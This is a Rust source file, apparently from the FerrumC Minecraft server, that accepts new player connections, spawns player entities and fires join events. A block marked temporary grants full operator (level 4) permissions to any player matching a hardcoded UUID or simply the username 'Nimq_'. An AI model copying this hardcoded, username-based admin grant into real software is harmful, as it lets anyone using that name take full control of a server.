use bevy_ecs::prelude::{Commands, EventWriter, Res, Resource};
use crossbeam_channel::Receiver;
use ferrumc_join_leave_api::PlayerJoinEvent;
use ferrumc_core::chunks::chunk_receiver::ChunkReceiver;
use ferrumc_core::conn::keepalive::KeepAliveTracker;
use ferrumc_core::permissions::PlayerPermissions;
use ferrumc_core::transform::grounded::OnGround;
use ferrumc_core::transform::position::Position;
use ferrumc_core::transform::rotation::Rotation;
use ferrumc_inventories::hotbar::Hotbar;
use ferrumc_inventories::inventory::Inventory;
use ferrumc_net::connection::{DisconnectHandle, NewConnection};
use ferrumc_state::GlobalStateResource;
use std::time::Instant;
use tracing::{error, trace, info};

#[derive(Resource)]
pub struct NewConnectionRecv(pub Receiver<NewConnection>);

pub fn accept_new_connections(
    mut cmd: Commands,
    new_connections: Res<NewConnectionRecv>,
    state: Res<GlobalStateResource>,
    mut join_events: EventWriter<PlayerJoinEvent>,
) {
    if new_connections.0.is_empty() {
        return;
    }
    while let Ok(new_connection) = new_connections.0.try_recv() {
        let return_sender = new_connection.entity_return;
        
        // TEMPORARY: Auto-OP for Nimq_ until console is available
        let mut player_permissions = PlayerPermissions::default();
        if new_connection.player_identity.uuid.as_u128() == 0xf999e944a15d4287bff434f63a97832e
            || new_connection.player_identity.username == "Nimq_"
        {
            player_permissions.add_group("minecraft.op.level.4");
            info!("🔑 Auto-granted OP level 4 to {} (temporary hardcoded)", new_connection.player_identity.username);
        }
        
        let entity = cmd.spawn((
            new_connection.stream,
            DisconnectHandle {
                sender: Some(new_connection.disconnect_handle),
            },
            Position::default(),
            ChunkReceiver::default(),
            Rotation::default(),
            OnGround::default(),
            new_connection.player_identity.clone(),
            KeepAliveTracker {
                last_sent_keep_alive: 0,
                last_received_keep_alive: Instant::now(),
                has_received_keep_alive: true,
            },
            Inventory::new(46),
            Hotbar::default(),
            player_permissions,
        ));

        state.0.players.player_list.insert(
            entity.id(),
            (
                new_connection.player_identity.uuid.as_u128(),
                new_connection.player_identity.username.clone(),
            ),
        );

        trace!("Spawned entity for new connection: {:?}", entity.id());
        // Add the new entity to the global state
        state.0.players.player_list.insert(
            entity.id(),
            (
                new_connection.player_identity.uuid.as_u128(),
                new_connection.player_identity.username.clone(),
            ),
        );

        // Fire PlayerJoinEvent for plugins to handle
        join_events.write(PlayerJoinEvent {
            joining_player: entity.id(),
            identity: new_connection.player_identity.clone(),
        });

        if let Err(err) = return_sender.send(entity.id()) {
            error!(
                "Failed to send entity ID back to the networking thread: {:?}",
                err
            );
        }
    }
}
